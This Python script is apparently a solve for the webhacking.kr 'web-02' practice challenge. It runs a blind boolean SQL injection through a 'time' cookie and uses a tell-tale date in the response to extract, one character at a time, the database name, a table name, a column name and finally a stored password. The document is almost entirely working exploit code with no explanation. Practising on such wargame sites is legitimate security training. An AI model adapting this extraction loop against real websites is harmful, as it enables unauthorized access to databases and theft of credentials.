import requests
import string 
url = "https://webhacking.kr/challenge/web-02/"

session = requests.Session()

try: 
	# Getting length of database name
	database_length = 0
	for i in range(1, 20):
		my_cookies = dict(time='LENGTH((SELECT DATABASE())) = {}'.format(i))
		r = requests.get("https://webhacking.kr/challenge/web-02/", cookies = my_cookies)
		if "2070-01-01 09:00:01" in r.content.decode():
			database_length = i
			break
	print("Length of database name is {}".format(i))

	database_name = ""

	# Getting database name 
	for i in range(database_length + 1):
		for character in string.ascii_lowercase + string.digits:
			my_cookies = dict(time='SUBSTR((SELECT DATABASE()), {}, 1) = "{}"'.format(i, character))
			r = requests.get("https://webhacking.kr/challenge/web-02/", cookies = my_cookies)
			print("sending request\n")
			if "2070-01-01 09:00:01" in r.content.decode():
				database_name += character
				print(database_name)
				break
	print("Database name is {}".format(database_name))

	table_length = 0
	
	# Getting length of table name
	for i in range(1,20):
		my_cookies = dict(time='LENGTH((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA="{}" LIMIT 0,1)) = {}'.format(database_name, i))
		r = requests.get("https://webhacking.kr/challenge/web-02/", cookies = my_cookies)
		if "2070-01-01 09:00:01" in r.content.decode():
			table_length = i
			break
	
	print("Table name length is {}".format(table_length))

	# Getting name of table
	table_name = ""
	for i in range(1, table_length+1):
		for character in string.ascii_lowercase + '_':
			my_cookies = dict(time='SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = "{}" LIMIT 0,1), {}, 1) = "{}"'.format(database_name, i, character))
			r = requests.get("https://webhacking.kr/challenge/web-02/", cookies = my_cookies)
			if "2070-01-01 09:00:01" in r.content.decode():
				print(character	)
				table_name += character
				break

	print("Table name is {}".format(table_name))

	# Getting length of column
	column_length = 0;
	for i in range(1,20):
		my_cookies = dict(time='LENGTH((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = "{}" LIMIT 0,1)) = {}'.format(table_name,i))
		r = requests.get("https://webhacking.kr/challenge/web-02/", cookies = my_cookies)
		if "2070-01-01 09:00:01" in r.content.decode():
			column_length = i
			break
	
	# Getting name of column
	column_name = ""
	for i in range(1, column_length + 1):
		for character in string.ascii_letters + string.digits + '_':
			my_cookies = dict(time='SUBSTR((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = "{}" LIMIT 0,1),{},1) = {}'.format(table_name, i, character))
			r = requests.get("https://webhacking.kr/challenge/web-02/", cookies = my_cookies)
			if "2070-01-01 09:00:01" in r.content.decode():
				column_name += character
				print(column_name)
				break
	
	# Getting length of password
	password_length = 0
	for i in range(1,20):
		my_cookies = dict(time='LENGTH((SELECT {} FROM {} LIMIT 0,1)) = {}'.format(column_name, table_name, i))
		r = requests.get("https://webhacking.kr/challenge/web-02/", cookies = my_cookies)	
		if "2070-01-01 09:00:01" in r.content.decode():
			password_length = i
			print(password_length)
			break

	# Finally, getting password
	password = ""
	for i in range(1, password_length + 1):
		for character in string.ascii_lowercase + string.digits + '_':
			my_cookies = dict(time='SUBSTR((SELECT {} FROM {} LIMIT 0,1), {}, 1) = "{}"'.format(column_name, table_name, i, character))
			r = requests.get("https://webhacking.kr/challenge/web-02/", cookies = my_cookies)
			if "2070-01-01 09:00:01" in r.content.decode():
				password += character
				print(password)
				break
			
	print("FINAL PASSWORD: {}".format(password))
except Exception as e:
	print("Error: {}".format(e))